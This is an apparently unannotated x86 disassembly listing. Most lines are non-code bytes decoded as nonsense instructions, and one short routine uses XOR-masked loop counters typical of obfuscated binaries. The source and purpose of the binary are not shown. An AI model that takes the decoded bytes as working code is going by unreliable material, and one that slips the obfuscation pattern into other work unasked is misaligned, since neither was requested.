  42085d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42085e:	xchg   DWORD PTR [edx+ebx*2],edx
  420861:	jbe    0x420851
  420863:	sub    edx,DWORD PTR [eax]
  420865:	shl    BYTE PTR [esi],1
  420867:	(bad)  
  420868:	mov    al,0x34
  42086a:	sbb    eax,ebx
  42086c:	fwait
  42086d:	div    DWORD PTR [edx+0x63253942]
  420873:	add    cl,cl
  420875:	or     DWORD PTR [ecx-0x413c4544],ebx
  42087b:	arpl   WORD PTR [edi],cx
  42087d:	jmp    0x856b:0x4c21c541
  420884:	mov    eax,ds:0x97558aa3
  420889:	adc    esi,ebp
  42088b:	mov    ecx,0xd9b0c0bd
  420890:	aam    0xb7
  420892:	add    ecx,0x526c3b3e
  420898:	jmp    0x4208b9
  42089a:	pop    es
  42089b:	pushf  
  42089c:	adc    BYTE PTR [ecx],ah
  42089e:	mov    edi,0xe3350162
  4208a3:	popf   
  4208a4:	pop    eax
  4208a5:	aam    0x5f
  4208a7:	sar    DWORD PTR [eax],cl
  4208a9:	jns    0x420907
  4208ab:	xchg   esp,eax
  4208ac:	es dec edx
  4208ae:	rsqrtps xmm1,xmm7
  4208b1:	cli    
  4208b2:	sub    eax,0x9f56f77
  4208b7:	cmc    
  4208b8:	jg     0x4208a9
  4208ba:	push   cs
  4208bb:	aam    0xf5
  4208bd:	daa    
  4208be:	outs   dx,DWORD PTR ds:[esi]
  4208bf:	mov    bh,0x64
  4208c1:	push   ecx
  4208c2:	xchg   edx,eax
  4208c3:	push   0xffffffce
  4208c5:	pop    esi
  4208c6:	loope  0x420898
  4208c8:	dec    edi
  4208c9:	jns    0x4208f5
  4208cb:	cmp    eax,DWORD PTR [ecx]
  4208cd:	into   
  4208ce:	iret   
  4208cf:	adc    DWORD PTR [edx-0x735b63e],0xd1404223
  4208d9:	arpl   WORD PTR [eax],dx
  4208db:	mov    al,0xb4
  4208dd:	pop    eax
  4208de:	push   eax
  4208df:	adc    eax,0xa77d0a85
  4208e4:	lea    esp,[edx-0x12cd19c0]
  4208ea:	not    eax
  4208ec:	(bad)  
  4208ed:	xlat   BYTE PTR ds:[ebx]
  4208ee:	cdq    
  4208ef:	dec    edi
  4208f0:	cmp    al,0x82
  4208f2:	pminsw mm1,QWORD PTR ds:0x6e454db2
  4208f9:	sub    DWORD PTR [edi+ebp*2-0x71],ecx
  4208fd:	nop
  4208fe:	jmp    0x4a81:0xb4cea45a
  420905:	mov    esi,0xa85f31a4
  42090a:	cwde   
  42090b:	mov    ebp,DWORD PTR [esi+0x13]
  42090e:	in     eax,dx
  42090f:	sbb    eax,0xc37154fe
  420914:	scas   al,BYTE PTR es:[edi]
  420915:	stos   DWORD PTR es:[edi],eax
  420916:	ins    BYTE PTR es:[edi],dx
  420917:	sub    al,0xe7
  420919:	xor    ebp,DWORD PTR [ebp-0x4a]
  42091c:	sbb    edx,eax
  42091e:	shl    BYTE PTR [ecx+0x5c66e40e],cl
  420924:	lods   al,BYTE PTR ds:[esi]
  420925:	fcomp  QWORD PTR [ebp-0x6b]
  420928:	or     BYTE PTR [edx+0x3],ch
  42092b:	ins    DWORD PTR es:[edi],dx
  42092c:	sbb    ch,BYTE PTR [edi+0x1e]
  42092f:	arpl   cx,dx
  420931:	cwde   
  420932:	add    al,0xe4
  420934:	jnp    0x4208cc
  420936:	xchg   edx,eax
  420937:	scas   al,BYTE PTR es:[edi]
  420938:	dec    esp
  420939:	pusha  
  42093a:	(bad)  
  42093c:	(bad)  
  42093d:	loopne 0x420972
  42093f:	xchg   BYTE PTR [ebx],bl
  420941:	pop    esi
  420942:	xchg   edx,eax
  420943:	mov    dl,0x98
  420945:	and    al,BYTE PTR [ebx]
  420947:	and    BYTE PTR [eax-0x56c5c8c8],ah
  42094d:	fstp   DWORD PTR [edx-0x20]
  420950:	(bad)  
  420951:	ss js  0x420906
  420954:	xor    ebx,DWORD PTR [edx]
  420956:	mov    al,0x71
  420958:	pop    edx
  420959:	in     al,0xae
  42095b:	pop    ss
  42095c:	pop    es
  42095d:	cmp    DWORD PTR [ebx+0x14],edi
  420960:	and    bh,BYTE PTR [edi]
  420962:	jmp    ecx
  420964:	cmp    esi,eax
  420966:	in     al,dx
  420967:	mov    eax,ds:0xdc2a70a0
  42096c:	mov    ds:0xc58858c1,eax
  420971:	adc    eax,0xa2353004
  420976:	adc    BYTE PTR [eax-0x5cc8807f],dh
  42097c:	sub    DWORD PTR [edi],ecx
  42097e:	ins    BYTE PTR es:[edi],dx
  42097f:	mov    cl,0x2d
  420981:	fld    QWORD PTR [esi-0xa49e9b2]
  420987:	loop   0x420938
  420989:	lds    eax,FWORD PTR [ebp+0x25]
  42098c:	mov    ecx,0xbad01254
  420991:	jne    0x420967
  420993:	mov    BYTE PTR [ebx-0x25],ch
  420996:	and    bh,BYTE PTR [edi+0x53c1b82c]
  42099c:	xor    ch,BYTE PTR [edi]
  42099e:	in     al,0xf9
  4209a0:	inc    ebp
  4209a1:	add    al,0x5f
  4209a3:	adc    eax,0xc23d8cb1
  4209a8:	push   ecx
  4209a9:	adc    BYTE PTR [esp+ecx*2],0x17
  4209ad:	pop    ecx
  4209ae:	or     DWORD PTR [eax+eax*1],edi
  4209b1:	fistp  QWORD PTR [eax-0x35]
  4209b4:	call   0x8fd28a6f
  4209b9:	in     eax,dx
  4209ba:	mov    ah,BYTE PTR [ebx+0x34b3502]
  4209c0:	inc    edi
  4209c1:	test   eax,0x58d99fb1
  4209c6:	mov    dh,0x38
  4209c8:	mov    cl,0x47
  4209ca:	lods   al,BYTE PTR ds:[esi]
  4209cb:	test   eax,0xa402ef3
  4209d0:	nop
  4209d1:	and    eax,0xf53f84df
  4209d6:	loopne 0x4209e8
  4209d8:	inc    ebx
  4209d9:	into   
  4209da:	dec    ebp
  4209dc:	or     ecx,DWORD PTR [ebx]
  4209de:	pop    esp
  4209df:	scas   al,BYTE PTR es:[edi]
  4209e0:	pop    ebp
  4209e1:	cli    
  4209e2:	push   es
  4209e3:	dec    ecx
  4209e4:	js     0x420a19
  4209e6:	or     esi,ebx
  4209e8:	pop    eax
  4209e9:	lods   eax,DWORD PTR ds:[esi]
  4209ea:	xor    BYTE PTR [edi],bl
  4209ec:	cmp    dl,bh
  4209ee:	pop    ds
  4209ef:	pushf  
  4209f0:	jl     0x420994
  4209f2:	imul   edi,DWORD PTR ds:0xedce6c3c,0xfffffffb
  4209f9:	and    bh,BYTE PTR [edx+0x11caab8]
  4209ff:	je     0x420a43
  420a01:	rol    DWORD PTR [esi+eax*2+0xb],cl
  420a05:	jnp    0x4209ef
  420a07:	mov    ?,eax
  420a09:	xor    esi,DWORD PTR ds:0xace763d1
  420a0f:	push   ebp
  420a10:	mov    al,ds:0x704d7a3e
  420a15:	sbb    ch,al
  420a17:	pushf  
  420a18:	sti    
  420a19:	(bad)  
  420a1a:	aam    0xdb
  420a1c:	xor    DWORD PTR [edx+0x40],esi
  420a1f:	pop    edi
  420a20:	into   
  420a21:	jl     0x4209dc
  420a23:	pop    ss
  420a24:	imul   edi,DWORD PTR [ebx-0x61],0xc835ea93
  420a2b:	xchg   esp,eax
  420a2c:	mov    ds:0xd6f71507,al
  420a31:	clc    
  420a32:	mov    ch,0xa0
  420a34:	lods   al,BYTE PTR ds:[esi]
  420a36:	lods   eax,DWORD PTR ds:[esi]
  420a37:	and    DWORD PTR [ebx],0xffffffc6
  420a3a:	inc    esp
  420a3b:	add    DWORD PTR [eax-0x633a3bd4],esi
  420a41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420a42:	mov    WORD PTR ds:0x40993df1,fs
  420a48:	aad    0x8
  420a4a:	pop    ecx
  420a4b:	(bad)  
  420a4c:	mov    ah,0x48
  420a4e:	xchg   ah,dh
  420a50:	mov    esp,0x9e657464
  420a55:	stos   DWORD PTR es:[edi],eax
  420a56:	xor    ecx,ebx
  420a58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420a59:	iret   
  420a5a:	or     esp,DWORD PTR es:[ebp+eax*8+0x110ddd71]
  420a62:	std    
  420a63:	call   DWORD PTR [eax+0x69]
  420a66:	mov    edi,DWORD PTR [eax+0x38f685e]
  420a6c:	loop   0x420a3d
  420a6e:	(bad)  
  420a6f:	lods   eax,DWORD PTR ds:[esi]
  420a70:	leave  
  420a71:	mov    dh,0xad
  420a73:	or     ebp,DWORD PTR [ebp-0x1d23eac6]
  420a79:	cwde   
  420a7a:	add    DWORD PTR fs:[edi+ebx*4+0x52],ebx
  420a7f:	mov    bl,0xb0
  420a81:	sub    DWORD PTR [edi-0x3d],ebx
  420a84:	push   0x29
  420a86:	stc    
  420a87:	inc    ebx
  420a88:	aad    0x91
  420a8a:	(bad)  
  420a8b:	sub    ebx,DWORD PTR [edi-0x5]
  420a8e:	cmc    
  420a8f:	and    al,0x56
  420a91:	mov    esp,cr2
  420a94:	mov    DWORD PTR [eax-0x589fd0a3],ebp
  420a9a:	cli    
  420a9b:	inc    ebp
  420a9c:	add    esp,DWORD PTR [edx+0x34ee9e97]
  420aa2:	xchg   ebx,eax
  420aa3:	jle    0x420a62
  420aa5:	sbb    BYTE PTR [eax],dl
  420aa7:	xchg   ebp,eax
  420aa8:	push   eax
  420aa9:	icebp  
  420aaa:	push   eax
  420aab:	aaa    
  420aac:	and    eax,0xb7103a85
  420ab1:	pushf  
  420ab2:	lds    esi,FWORD PTR [ecx+0x25]
  420ab5:	les    esp,FWORD PTR [edi+0x22]
  420ab8:	sub    bh,0xda
  420abb:	pop    ecx
  420abc:	fs jl  0x420a5d
  420abf:	iret   
  420ac0:	mov    ebx,0xe5ffc4f8
  420ac5:	stos   DWORD PTR es:[edi],eax
  420ac6:	push   esi
  420ac7:	mov    dh,0x69
  420ac9:	fldlg2 
  420acb:	lock dec ebp
  420acd:	lea    edx,[eax]
  420acf:	iret   
  420ad0:	push   eax
  420ad1:	push   ss
  420ad2:	mov    edx,0x2fa944f7
  420ad7:	stos   BYTE PTR es:[edi],al
  420ad8:	out    0x58,eax
  420ada:	addr16 pop edx
  420adc:	mov    ch,0x68
  420ade:	stos   BYTE PTR es:[edi],al
  420adf:	test   al,0xad
  420ae1:	lea    edi,[esi+0x47]
  420ae4:	in     eax,0x60
  420ae6:	cs es jmp 0x267e:0x820e36df
  420aef:	jl     0x420ad5
  420af1:	mov    al,0x6
  420af3:	out    dx,eax
  420af4:	stos   DWORD PTR es:[edi],eax
  420af5:	fld    DWORD PTR fs:[ebp-0x2c]
  420af9:	inc    ebp
  420afa:	xor    esp,DWORD PTR [ecx-0x68d92be]
  420b00:	mov    bl,al
  420b02:	jecxz  0x420a9c
  420b04:	(bad)  
  420b05:	fiadd  WORD PTR [ecx]
  420b07:	fistp  DWORD PTR ds:0x470b2467
  420b0d:	rol    DWORD PTR [ebp-0x1e],cl
  420b10:	sub    eax,0x2a1b123d
  420b15:	jb     0x420aca
  420b17:	shl    BYTE PTR ss:[esi+0x6038386f],1
  420b1e:	push   ebx
  420b1f:	bound  ebx,QWORD PTR [edi+edx*1-0x6bfb7464]
  420b26:	jmp    0xe0d5ccb6
  420b2b:	or     DWORD PTR [eax+0x1a2e46ce],eax
  420b31:	outs   dx,DWORD PTR ds:[esi]
  420b32:	jge    0x420bab
  420b34:	or     al,0xbf
  420b36:	test   BYTE PTR [ebp-0x6d7bd2c8],0xc2
  420b3d:	fwait
  420b3e:	bound  ebx,QWORD PTR [ecx+ecx*2-0x2a]
  420b42:	inc    ebp
  420b43:	sbb    al,0x21
  420b45:	lock (bad) 
  420b47:	popf   
  420b48:	or     ch,BYTE PTR [edx+0x2b8e91ed]
  420b4e:	or     eax,0x282bc373
  420b53:	test   eax,0xf3022cb9
  420b58:	push   0x4e0e6362
  420b5d:	add    edi,DWORD PTR [ecx+0x4d]
  420b60:	sar    DWORD PTR [ebx],1
  420b62:	inc    eax
  420b63:	pop    eax
  420b64:	push   edi
  420b65:	sbb    DWORD PTR [eax-0x3067e0bc],ebp
  420b6b:	mov    ebx,edx
  420b6d:	dec    ebp
  420b6e:	in     al,dx
  420b6f:	clc    
  420b70:	addr16 xchg ebx,eax
  420b72:	jo     0x420b9a
  420b74:	ss iret 
  420b76:	xchg   esp,eax
  420b77:	jecxz  0x420b74
  420b79:	and    bl,bh
  420b7b:	xor    dl,0x59
  420b7e:	addr16 mov dl,0x49
  420b81:	in     eax,0xa1
  420b83:	dec    eax
  420b84:	pushf  
  420b85:	gs daa 
  420b87:	jno    0x420be1
  420b89:	mov    ebx,esp
  420b8b:	xchg   edi,eax
  420b8c:	out    0x4a,eax
  420b8e:	and    al,0x67
  420b90:	cmp    dl,BYTE PTR [eax+ebx*4]
  420b93:	dec    ebx
  420b94:	pop    ebx
  420b95:	and    al,BYTE PTR ds:0xd94ec413
  420b9b:	pop    ds
  420b9c:	sub    BYTE PTR [esi-0x25],al
  420b9f:	imul   esi,DWORD PTR [esi],0xa
  420ba2:	mov    BYTE PTR [ebx],al
  420ba4:	loop   0x420b60
  420ba6:	in     eax,0xe6
  420ba8:	xchg   edx,eax
  420ba9:	lods   eax,DWORD PTR ds:[esi]
  420baa:	mov    dh,0xc2
  420bac:	cli    
  420bad:	mov    ebx,0xd0b4761f
  420bb2:	imul   edi,esi,0xffffff8f
  420bb5:	add    bl,BYTE PTR [eax]
  420bb7:	pop    edx
  420bb8:	mov    ebx,0x8ee89410
  420bbd:	scas   eax,DWORD PTR es:[edi]
  420bbe:	pop    ebp
  420bbf:	dec    eax
  420bc0:	pushf  
  420bc1:	xor    esp,DWORD PTR [ecx+eax*4-0x4176cc06]
  420bc8:	loopne 0x420bb2
  420bca:	lods   al,BYTE PTR ds:[esi]
  420bcb:	ins    BYTE PTR es:[edi],dx
  420bcc:	cld    
  420bcd:	pop    eax
  420bce:	daa    
  420bcf:	cmp    eax,0xac866d68
  420bd4:	call   0xcb2f8885
  420bd9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420bda:	lahf   
  420bdb:	pop    ds
  420bdc:	pop    DWORD PTR [ebx-0x1]
  420bdf:	xchg   esi,eax
  420be0:	push   ecx
  420be1:	and    BYTE PTR [esi+0x240dd293],0xbc
  420be8:	cli    
  420be9:	add    BYTE PTR [eax-0xe5d98f5],dh
  420bef:	mov    esi,eax
  420bf1:	hlt    
  420bf2:	cld    
  420bf3:	retf   0xe012
  420bf6:	(bad)  
  420bf7:	out    0xdd,eax
  420bf9:	mov    edi,0x819abc81
  420bfe:	pop    esp
  420bff:	cmp    eax,0x3eff9fb4
  420c04:	daa    
  420c05:	cmp    BYTE PTR [ebx],ah
  420c07:	adc    DWORD PTR [ebp-0x5d299eee],ebx
  420c0d:	or     BYTE PTR [ecx+0x18630037],0x8
  420c14:	push   es
  420c15:	xchg   DWORD PTR [eax],ebp
  420c17:	jecxz  0x420c7a
  420c19:	lahf   
  420c1a:	sbb    ebp,DWORD PTR [ebp-0xc]
  420c1d:	jl     0x420c42
  420c1f:	mov    eax,ds:0x6a8c16c6
  420c24:	mov    esp,0x27641443
  420c29:	jmp    0x420c68
  420c2b:	loopne 0x420c58
  420c2d:	rcl    bl,cl
  420c2f:	imul   esi,DWORD PTR [esi-0x38],0xffffffcb
  420c33:	out    dx,eax
  420c34:	xlat   BYTE PTR ds:[ebx]
  420c35:	cs inc ebx
  420c37:	sbb    DWORD PTR [eax+0x19c9fdbc],eax
  420c3d:	icebp  
  420c3e:	sub    ch,dl
  420c40:	dec    edi
  420c41:	cld    
  420c42:	xor    bh,bh
  420c44:	mov    bl,0x8c
  420c46:	inc    esi
  420c47:	cmc    
  420c48:	rcr    esp,cl
  420c4a:	cmp    BYTE PTR [eax+ecx*4],dh
  420c4d:	pop    ecx
  420c4e:	jmp    0xe44aac61
  420c53:	retf   0xec2f
  420c56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420c57:	sub    DWORD PTR [ecx-0x39],0xffffffe9
  420c5b:	and    BYTE PTR [edx-0x14c8a12e],ah
  420c61:	dec    eax
  420c62:	dec    ebp
  420c63:	es jnp 0x420c7b
  420c66:	ja     0x420c64
  420c68:	retf   0xb115
  420c6b:	mov    eax,0x539c25e0
  420c70:	xchg   BYTE PTR [eax],al
  420c72:	rol    DWORD PTR [ebx-0x39aa79ac],cl
  420c78:	js     0x420c9d
  420c7a:	pop    eax
  420c7b:	fstp   QWORD PTR [esi-0x7b422520]
  420c81:	inc    esi
  420c82:	mov    edi,0x92508709
  420c87:	lock cmp cl,al
  420c8a:	dec    edi
  420c8b:	pusha  
  420c8c:	rol    BYTE PTR [ebx],0xa
  420c8f:	push   0x45
  420c91:	(bad)  
  420c92:	std    
  420c93:	adc    BYTE PTR [edx],cl
  420c95:	push   ds
  420c96:	push   edx
  420c97:	fmul   DWORD PTR ds:0xdd2f142c
  420c9d:	js     0x420cc2
  420c9f:	out    dx,al
  420ca0:	add    al,0xb9
  420ca2:	jecxz  0x420ca4
  420ca4:	jnp    0x420c53
  420ca6:	fdiv   QWORD PTR [ecx-0x55]
  420ca9:	push   edx
  420caa:	push   esp
  420cab:	mov    eax,ds:0x4c874064
  420cb0:	inc    edx
  420cb1:	outs   dx,DWORD PTR ds:[esi]
  420cb2:	pop    esi
  420cb3:	fmul   st(5),st
  420cb5:	pop    edx
  420cb6:	xor    eax,0x39c59081
  420cbb:	inc    edi
  420cbc:	popf   
  420cbd:	pop    DWORD PTR [edx]
  420cbf:	and    bl,bh
  420cc1:	imul   edx,DWORD PTR [esi-0x7e],0x52cd2db8
  420cc8:	test   al,0xe9
  420cca:	sbb    edx,0x24
  420ccd:	fiadd  WORD PTR [ebp+0x12a863af]
  420cd3:	adc    eax,0x1c786b35
  420cd8:	xchg   ebp,eax
  420cd9:	out    dx,eax
  420cda:	and    dl,ah
  420cdc:	aad    0x25
  420cde:	xchg   edx,eax
  420cdf:	daa    
  420ce0:	dec    edx
  420ce1:	call   0xcba54181
  420ce6:	jo     0x420cea
  420ce8:	jns    0x420d3b
  420cea:	adc    DWORD PTR [eax-0x67],edx
  420ced:	test   BYTE PTR [esi+edi*1-0x43],ah
  420cf1:	stos   BYTE PTR es:[edi],al
  420cf2:	push   0x27
  420cf4:	sub    dh,BYTE PTR [eax]
  420cf6:	xchg   BYTE PTR [esi+0x32],bl
  420cf9:	outs   dx,DWORD PTR ds:[esi]
  420cfa:	sbb    al,0x6a
  420cfc:	loopne 0x420ceb
  420cfe:	mov    bl,0x2
  420d00:	sub    BYTE PTR ds:[esi],al
  420d03:	daa    
  420d04:	xchg   DWORD PTR [edx],esp
  420d06:	pop    esi
  420d07:	lahf   
  420d08:	xlat   BYTE PTR ds:[ebx]
  420d09:	jecxz  0x420d7f
  420d0b:	pop    ss
  420d0c:	xor    al,0x2f
  420d0e:	fcomi  st,st(2)
  420d10:	xchg   BYTE PTR [edx+ebp*4+0x4f],bl
  420d14:	imul   ebx,ebp,0x3a89fb33
  420d1a:	mov    edx,DWORD PTR [ebp+0x8]
  420d1d:	xor    edx,eax
  420d1f:	inc    ecx
  420d20:	inc    DWORD PTR [ebp-0x18]
  420d23:	add    edx,esi
  420d25:	cmp    ecx,edx
  420d27:	jb     0x41e963
  420d2d:	jmp    0x420d77
  420d32:	mov    ecx,DWORD PTR [ebp-0xc]
  420d35:	mov    DWORD PTR [ebp+0x8],ecx
  420d38:	jmp    0x420d6a
  420d3d:	mov    ecx,DWORD PTR [ebp+0x8]
  420d40:	mov    edx,DWORD PTR [ebp-0x8]
  420d43:	xor    ecx,eax
  420d45:	xor    edx,eax
  420d47:	sub    ecx,edx
  420d49:	sub    ecx,esi
  420d4b:	xor    ecx,eax
  420d4d:	mov    DWORD PTR [ebp+0x8],ecx
  420d50:	mov    ecx,DWORD PTR [ebp+0x8]
  420d53:	mov    edx,DWORD PTR [ebp+0x8]
  420d56:	imul   edx,edx,0x5708f2
  420d5c:	xor    ecx,eax
  420d5e:	add    ecx,esi
  420d60:	lea    ecx,[ebp+ecx*4-0x64]
  420d64:	mov    edi,DWORD PTR [ecx]
  420d66:	add    edx,edi
  420d68:	mov    DWORD PTR [ecx],edx
  420d6a:	mov    ecx,DWORD PTR [ebp+0x8]
  420d6d:	xor    ecx,eax
  420d6f:	add    ecx,esi
  420d71:	jne    0x420d3d
  420d77:	mov    ecx,DWORD PTR [ebp-0xc]
  420d7a:	mov    DWORD PTR [ebp+0x8],ecx
  420d7d:	jmp    0x420daf
  420d82:	mov    ecx,DWORD PTR [ebp+0x8]
  420d85:	mov    edx,DWORD PTR [ebp-0x8]
  420d88:	xor    ecx,eax
  420d8a:	xor    edx,eax
  420d8c:	sub    ecx,edx
  420d8e:	sub    ecx,esi
  420d90:	xor    ecx,eax
  420d92:	mov    DWORD PTR [ebp+0x8],ecx
  420d95:	mov    ecx,DWORD PTR [ebp+0x8]
  420d98:	mov    edx,DWORD PTR [ebp+0x8]
  420d9b:	imul   edx,edx,0x5708f2
  420da1:	xor    ecx,eax
  420da3:	add    ecx,esi
  420da5:	lea    ecx,[ebp+ecx*4-0x64]
  420da9:	mov    edi,DWORD PTR [ecx]
  420dab:	add    edx,edi
  420dad:	mov    DWORD PTR [ecx],edx
  420daf:	mov    ecx,DWORD PTR [ebp+0x8]
  420db2:	xor    ecx,eax
  420db4:	add    ecx,esi
  420db6:	jne    0x420d82
  420dbc:	mov    ecx,DWORD PTR [ebp-0x8]
  420dbf:	mov    edx,DWORD PTR [ebp-0x20]
  420dc2:	xor    ecx,eax
  420dc4:	lea    ecx,[ecx+edx*1+0x3272dd]
  420dcb:	mov    DWORD PTR [ebp-0x20],ecx
  420dce:	inc    DWORD PTR [ebp+0xc]
  420dd1:	mov    ecx,DWORD PTR [ebp-0x1c]
  420dd4:	xor    ecx,eax
  420dd6:	add    ecx,esi
  420dd8:	jne    0x413678
  420dde:	jmp    0x420e67
  420de3:	mov    ecx,DWORD PTR [ebp-0xc]
  420de6:	mov    DWORD PTR [ebp+0x8],ecx
  420de9:	jmp    0x420e1b
  420dee:	mov    ecx,DWORD PTR [ebp+0x8]
  420df1:	mov    edx,DWORD PTR [ebp-0x8]
  420df4:	xor    ecx,eax
  420df6:	xor    edx,eax
  420df8:	sub    ecx,edx
  420dfa:	sub    ecx,esi
  420dfc:	xor    ecx,eax
  420dfe:	mov    DWORD PTR [ebp+0x8],ecx
  420e01:	mov    ecx,DWORD PTR [ebp+0x8]
  420e04:	mov    edx,DWORD PTR [ebp+0x8]
  420e07:	imul   edx,edx,0x5708f2
  420e0d:	xor    ecx,eax
  420e0f:	add    ecx,esi
  420e11:	lea    ecx,[ebp+ecx*4-0x64]
  420e15:	mov    edi,DWORD PTR [ecx]
  420e17:	add    edx,edi
  420e19:	mov    DWORD PTR [ecx],edx
  420e1b:	mov    ecx,DWORD PTR [ebp+0x8]
  420e1e:	xor    ecx,eax
  420e20:	add    ecx,esi
  420e22:	jne    0x420dee
  420e28:	jmp    0x420e73
  420e2d:	mov    ecx,DWORD PTR [ebp+0x8]
  420e30:	mov    edx,DWORD PTR [ebp-0x8]
  420e33:	xor    ecx,eax
  420e35:	xor    edx,eax
  420e37:	sub    ecx,edx
  420e39:	sub    ecx,esi
  420e3b:	xor    ecx,eax
  420e3d:	mov    DWORD PTR [ebp+0x8],ecx
  420e40:	mov    ecx,DWORD PTR [ebp+0x8]
  420e43:	mov    edx,DWORD PTR [ebp+0x8]
  420e46:	xor    ecx,eax
  420e48:	imul   edx,edx,0x5708f2
  420e4e:	add    ecx,esi
  420e50:	lea    ecx,[ebp+ecx*4-0x64]
  420e54:	mov    edi,DWORD PTR [ecx]
  420e56:	add    edx,edi
  420e58:	mov    DWORD PTR [ecx],edx
  420e5a:	mov    ecx,DWORD PTR [ebp+0x8]
  420e5d:	xor    ecx,eax
  420e5f:	add    ecx,esi
  420e61:	jne    0x420e2d
  420e67:	mov    ecx,DWORD PTR [ebp-0x8]
  420e6a:	xor    ecx,eax
  420e6c:	mov    eax,DWORD PTR [ebp+0x10]
  420e6f:	add    ecx,esi
  420e71:	mov    DWORD PTR [eax],ecx
  420e73:	pop    edi
  420e74:	pop    esi
  420e75:	pop    ebx
  420e76:	leave  
  420e77:	ret    0xc
  420e7a:	dec    ebp
  420e7b:	and    eax,0x55210010
  420e80:	adc    BYTE PTR [eax],al
  420e82:	call   DWORD PTR [ebp+0x10]
  420e85:	add    bh,al
  420e87:	adc    BYTE PTR ss:[eax],al
  420e8a:	cld    
  420e8b:	ins    BYTE PTR es:[edi],dx
  420e8c:	adc    BYTE PTR [eax],al
  420e8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420e8f:	js     0x420ea1
  420e91:	add    BYTE PTR [ebx+eiz*2],al
  420e94:	adc    BYTE PTR [eax],al
  420e96:	dec    edi
  420e97:	jae    0x420ea9
  420e99:	add    ah,bl
  420e9b:	sub    eax,0x6ed60010
  420ea0:	adc    BYTE PTR [eax],al
  420ea2:	cmp    BYTE PTR [ecx],al
  420ea4:	adc    BYTE PTR [eax],al
  420ea6:	cwde   
  420ea7:	cmovb  eax,DWORD PTR [eax]
  420eaa:	pushf  
  420eab:	cmovb  eax,DWORD PTR [eax]
  420eae:	mov    al,ds:0xa400420f
  420eb3:	cmovb  eax,DWORD PTR [eax]
  420eb6:	test   al,0xf
  420eb8:	inc    edx
  420eb9:	add    BYTE PTR [edi+ecx*1+0xfb00042],ch
  420ec0:	inc    edx
  420ec1:	add    BYTE PTR [edi+ecx*1+0x42],dh
	...
  420ed4:	dec    edx
  420ed5:	aam    0xb3
  420ed7:	dec    ebp
  420ed8:	add    BYTE PTR [eax],al
  420eda:	add    BYTE PTR [eax],al
  420edc:	add    al,BYTE PTR [eax]
  420ede:	add    BYTE PTR [eax],al
  420ee0:	cmp    eax,0xc0000000
  420ee5:	lar    eax,WORD PTR [eax]
  420ee8:	rol    BYTE PTR [ebx],0x2
  420eeb:	add    BYTE PTR [edx+0xe],al
  420eee:	adc    BYTE PTR [eax],al
  420ef0:	pop    esp
  420ef1:	sbb    edx,DWORD PTR [eax]
  420ef3:	add    BYTE PTR [ebx-0x4dffefb0],cl
  420ef9:	sub    eax,0x29930010
  420efe:	adc    BYTE PTR [eax],al
  420f00:	mov    al,ds:0x5900101f
  420f05:	push   ebp
  420f06:	adc    BYTE PTR [eax],al
  420f08:	ret    0x102d
  420f0b:	add    BYTE PTR [edx+0xe],bh
  420f0e:	inc    edx
  420f0f:	add    BYTE PTR [esi+0xe],bh
  420f12:	inc    edx
  420f13:	add    BYTE PTR [edx-0x79ffbdf2],al
  420f19:	push   cs
  420f1a:	inc    edx
  420f1b:	add    BYTE PTR [edx-0x71ffbdf2],cl
  420f21:	push   cs
  420f22:	inc    edx
  420f23:	add    BYTE PTR [edx-0x69ffbdf2],dl
  420f29:	push   cs
  420f2a:	inc    edx
  420f2b:	add    BYTE PTR [edx-0x61ffbdf2],bl
  420f31:	push   cs
  420f32:	inc    edx
  420f33:	add    BYTE PTR [edx+0x5800420e],ah
  420f39:	cmovb  eax,DWORD PTR [eax]
  420f3c:	pop    esp
  420f3d:	cmovb  eax,DWORD PTR [eax]
  420f40:	pusha  
  420f41:	cmovb  eax,DWORD PTR [eax]
  420f44:	cmovb  eax,DWORD PTR fs:[eax]
  420f48:	push   0x6c00420f
  420f4d:	cmovb  eax,DWORD PTR [eax]
  420f50:	jo     0x420f61
  420f52:	inc    edx
  420f53:	add    BYTE PTR [edi+ecx*1+0x42],dh
  420f57:	add    al,cl
  420f59:	cmp    edx,DWORD PTR [eax]
  420f5b:	add    BYTE PTR [ecx+0x25],dh
  420f5e:	adc    BYTE PTR [eax],al
  420f60:	fld    TBYTE PTR [ecx]
  420f62:	adc    BYTE PTR [eax],al
  420f64:	xchg   edi,eax
  420f65:	sub    al,0x10
  420f67:	add    dh,ah
  420f69:	aaa    
  420f6a:	adc    BYTE PTR [eax],al
  420f6c:	and    eax,0xd5001051
  420f71:	xor    dl,BYTE PTR [eax]
  420f73:	add    BYTE PTR [eax-0x13ffefd8],ch
  420f79:	push   cs
  420f7a:	inc    edx
  420f7b:	add    al,dh
  420f7d:	push   cs
  420f7e:	inc    edx
  420f7f:	add    ah,dh
  420f81:	push   cs
  420f82:	inc    edx
  420f83:	add    al,bh
  420f85:	push   cs
  420f86:	inc    edx
  420f87:	add    ah,bh
  420f89:	push   cs
  420f8a:	inc    edx
  420f8b:	add    BYTE PTR [eax],al
  420f8d:	cmovb  eax,DWORD PTR [eax]
  420f90:	add    al,0xf
  420f92:	inc    edx
  420f93:	add    BYTE PTR [eax],cl
  420f95:	cmovb  eax,DWORD PTR [eax]
  420f98:	adc    DWORD PTR [ebp+0x10],ebx
  420f9b:	add    bh,cl
  420f9d:	push   es
  420f9e:	adc    BYTE PTR [eax],al
  420fa0:	xchg   esp,eax
  420fa1:	xor    eax,0x7b780010
  420fa6:	adc    BYTE PTR [eax],al
  420fa8:	stos   BYTE PTR es:[edi],al
  420fa9:	jo     0x420fbb
  420fab:	add    BYTE PTR [eax],ch
  420fad:	inc    esp
  420fae:	adc    BYTE PTR [eax],al
  420fb0:	pop    ebp
  420fb1:	pop    ecx
  420fb2:	adc    BYTE PTR [eax],al
  420fb4:	fild   QWORD PTR [edi]
  420fb6:	adc    BYTE PTR [eax],al
	...
  420fc0:	push   edx
  420fc1:	push   ebx
  420fc2:	inc    esp
  420fc3:	push   ebx
  420fc4:	xor    DWORD PTR [ecx+0x7e],0x8be7441d
  420fcb:	dec    eax
  420fcc:	mov    esi,0x811ca387
  420fd1:	in     al,dx
  420fd2:	xor    bl,dh
  420fd4:	add    DWORD PTR [eax],eax
  420fd6:	add    BYTE PTR [eax],al
  420fd8:	inc    ebx
  420fd9:	cmp    bl,BYTE PTR [ebx+eax*2+0x75]
